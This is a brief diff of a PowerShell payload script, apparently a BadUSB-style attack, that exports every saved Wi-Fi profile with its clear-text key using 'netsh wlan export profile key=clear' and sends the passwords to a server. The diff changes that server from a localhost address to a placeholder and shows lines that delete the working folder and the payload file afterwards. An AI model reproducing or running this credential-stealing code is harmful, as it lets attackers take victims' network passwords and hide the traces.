@@ -5,7 +5,7 @@ cd $p
 
 
 # Get all saved wifi password and send it to the server
-$server = "127.0.0.1:8000"
+$server = "<PROVIDE_SERVER_ADDRESS"
 netsh wlan export profile key=clear
 dir *.xml |% {
 $xml=[xml] (get-content $_)
@@ -21,5 +21,5 @@ cd ..
 rm wipass
 
 
-# remove payload
+# Remove payload
 rm d.ps1
